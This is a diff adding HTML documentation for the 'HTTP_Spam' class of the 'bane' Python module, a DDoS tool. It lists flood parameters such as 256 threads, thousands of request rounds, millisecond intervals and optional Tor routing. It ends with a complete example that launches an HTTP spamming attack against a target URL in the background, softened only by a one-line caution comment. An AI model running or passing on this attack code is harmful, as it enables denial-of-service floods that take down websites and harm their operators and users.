@@ -60,3 +60,78 @@ ddos_attack = HTTP_Puncher(
 
 # Be cautious and responsible when using DDoS attacks in a real environment.
 </code></pre>
+<h1>HTTP_Spam Class</h1>
+
+<h2>Class Overview</h2>
+<p>The <code>HTTP_Spam</code> class is part of the "bane" module and is used for performing HTTP spamming attacks on a target URL.</p>
+
+<h2>Class Constructor</h2>
+<pre><code>class HTTP_Spam(DDoS_Class)
+</code></pre>
+<p>This constructor initializes an instance of the <code>HTTP_Spam</code> class with the following parameters:</p>
+
+<ul>
+    <li><code>u</code> (str): The target URL for the spamming attack.</li>
+    <li><code>p</code> (int): Port number (default is 80).</li>
+    <li><code>cookie</code> (str): Custom cookies to include in requests.</li>
+    <li><code>user_agents</code> (list): List of custom User-Agent headers for requests.</li>
+    <li><code>method</code> (int): HTTP request method (1 for GET, 2 for POST, 3 for random; default is 3).</li>
+    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
+    <li><code>paths</code> (list): List of URL paths to target (default is ["/"]).</li>
+    <li><code>threads</code> (int): Number of threads for the spamming attack (default is 256).</li>
+    <li><code>post_min</code> (int): Minimum number of POST requests to send per round (default is 5).</li>
+    <li><code>post_max</code> (int): Maximum number of POST requests to send per round (default is 10).</li>
+    <li><code>post_field_min</code> (int): Minimum length of POST request fields (default is 50).</li>
+    <li><code>post_field_max</code> (int): Maximum length of POST request fields (default is 100).</li>
+    <li><code>timeout</code> (int): Request timeout in seconds (default is 5).</li>
+    <li><code>round_min</code> (int): Minimum number of rounds to run (default is 1000).</li>
+    <li><code>round_max</code> (int): Maximum number of rounds to run (default is 10000).</li>
+    <li><code>interval</code> (float): Time interval between requests (default is 0.001).</li>
+    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60).</li>
+    <li><code>tor</code> (bool): Use Tor for requests (default is False).</li>
+    <li><code>ssl_on</code> (bool): Enable SSL/TLS for requests (default is False).</li>
+    <li><code>logs</code> (bool): Enable or disable logging (default is True).</li>
+</ul>
+
+<h2>Methods</h2>
+<h3><code>attack(self)</code></h3>
+<p>This method initiates the HTTP spamming attack by sending HTTP requests to the target URL with random headers and data. It operates in a separate thread.</p>
+
+<h2>Example Usage</h2>
+<p>To use the <code>HTTP_Spam</code> class, create an instance of it by providing the required parameters, and it will start performing HTTP spamming attacks in the background. Here's an example:</p>
+
+<pre><code>
+from bane.ddos import HTTP_Spam
+
+# Create an instance of HTTP_Spam
+http_spam = HTTP_Spam(
+    u="https://example.com",
+    p=80,
+    cookie="CustomCookie",
+    user_agents=["UserAgent1", "UserAgent2"],
+    method=3,
+    threads_daemon=True,
+    paths=["/"],
+    threads=256,
+    post_min=5,
+    post_max=10,
+    post_field_min=50,
+    post_field_max=100,
+    timeout=5,
+    round_min=1000,
+    round_max=10000,
+    interval=0.001,
+    duration=60,
+    tor=False,
+    ssl_on=False,
+    logs=True
+)
+
+# HTTP spamming attack is performed in the background
+# Monitor the attack's progress as needed
+
+# To stop the attack, you can set http_spam.stop = True
+
+# Be cautious and responsible when using such attack techniques in a real environment.
+</code></pre>
+
